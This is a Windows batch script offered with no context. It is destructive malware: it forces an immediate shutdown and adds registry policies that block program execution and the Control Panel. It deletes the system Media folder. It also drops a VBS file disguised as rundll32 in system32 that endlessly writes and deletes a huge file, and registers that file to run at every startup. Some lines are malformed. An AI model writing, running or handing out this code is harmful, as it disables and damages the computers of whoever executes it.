@echo Hello
shutdown -s -t 1 -c "lol" >nul 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f >nul 
del "%SystemRoot%\Media" /q >nul
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer 
/v NoControlPanel /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache /v @C:\WINDOWS\system32\SHELL32.dll,-8964 /t REG_SZ /d Bandicam 
echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs 
echo do >> %systemdrive%\windows\system32\rundll32.vbs 
echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs 
echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs 
echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs 
echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs 
echo loop >> %systemdrive%\windows\system32\rundll32.vbs 
start %systemdrive%\windows\system32\rundll32.vbs 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f  /F
